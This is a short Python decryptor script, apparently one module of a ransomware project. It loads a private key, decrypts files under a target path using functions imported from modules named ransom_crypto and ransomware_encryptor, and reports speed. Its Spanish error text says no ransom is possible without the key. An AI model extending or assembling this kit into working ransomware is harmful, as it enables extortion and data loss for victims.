import sys
import time

from global_state import Global
from ransom_crypto import load_private_key
from ransomware_encryptor import decrypt_tree


def main():
    root = sys.argv[1] if len(sys.argv) > 1 else Global.TARGET_PATH

    try:
        private_key = load_private_key("private_key.pem")
    except FileNotFoundError:
        print("ERROR: falta private_key.pem junto a decrypt_tool.py — sin ella "
              "no hay rescate posible.", file=sys.stderr)
        return 1

    t0 = time.time()
    files, total = decrypt_tree(root, private_key)
    dt = time.time() - t0
    speed = (total / dt / (1024 * 1024)) if dt > 0 else 0
    print(f"Descifrados {files} archivos ({total} bytes) en {dt:.1f}s "
          f"({speed:.0f} MiB/s) bajo {root}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
